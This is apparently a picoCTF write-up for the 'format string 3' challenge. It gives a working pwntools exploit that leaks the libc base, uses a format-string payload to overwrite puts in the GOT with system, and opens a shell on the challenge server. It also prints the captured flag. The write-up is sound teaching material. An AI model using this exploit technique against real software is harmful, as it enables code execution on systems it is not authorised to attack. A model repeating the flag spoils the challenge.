# format string 3

---
AUTHOR: SKRUBLAWD

Description
This program doesn't contain a win function. How can you win?
Download the binary here.
Download the source here.
Download libc here, download the interpreter here. Run the binary with these two files present in the same directory.

---

Download all the files:

Now we need to link the program so that it can use the provided library. 

To do so we will use patchlef tool:


```bash
❯ patchelf --set-interpreter ./ld-linux-x86-64.so.2 --add-needed ./libc.so.6 ./format-string-3
```

you can verify it:

```bash
❯ ldd format-string-3
	linux-vdso.so.1 (0x00007fff349a1000)
	./libc.so.6 (0x00007f72fd8be000)
	./ld-linux-x86-64.so.2 => /lib64/ld-linux-x86-64.so.2 (0x00007f72fdaa2000)

```


---

Now some basic file check:

---
```bash
❯ checksec --file=format-string-3
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   RW-RUNPATH   44 Symbols	 No	format-string-3
```


```bash
❯ file format-string-3
format-string-3: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=54e1c4048a725df868e9a10dc975a46e8d8e5e92, not stripped
```

---


explit:

```python3
from pwn import *

e = ELF('./format-string-3')
libc = ELF('./libc.so.6')
context.binary = e


# p = process(e.path)
p = remote("rhea.picoctf.net", 55034)

# get libc offset
p.recvuntil(b'libc:')

libc.address = int(p.recvline(keepends = False),16) - libc.sym['setvbuf']

log.info('libc base:'+ hex(libc.address))
#overwrite puts got system when puts takes '/bin/sh' as parameter it will be inserted

s = fmtstr_payload(38, {e.got['puts']: libc.sym['system']})


p.sendline(s)

p.interactive()
```
---

Running the exploit

---

```bash
❯ python3 exploit.py
[*] '/home/lynk/picoCTF/format-string-3/format-string-3'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3fb000)
    RUNPATH:  b'.'
[*] '/home/lynk/picoCTF/format-string-3/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to rhea.picoctf.net on port 55034: Done
[*] Libc base:0x7505e9f2b000
[*] Switching to interactive mode
                                                                                               c                    \x8b                                                 \xb0                                                                                            
                                                                                                                                                                                                                                                                                                                                        
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            \x00\x18@@$ ls
Makefile
artifacts.tar.gz
flag.txt
format-string-3
format-string-3.c
ld-linux-x86-64.so.2
libc.so.6
metadata.json
profile
$ cat flag.txt
picoCTF{G07_G07?_7a2369d3}$ 
$ 
[*] Interrupted
[*] Closed connection to rhea.picoctf.net port 55034
❯

```

---









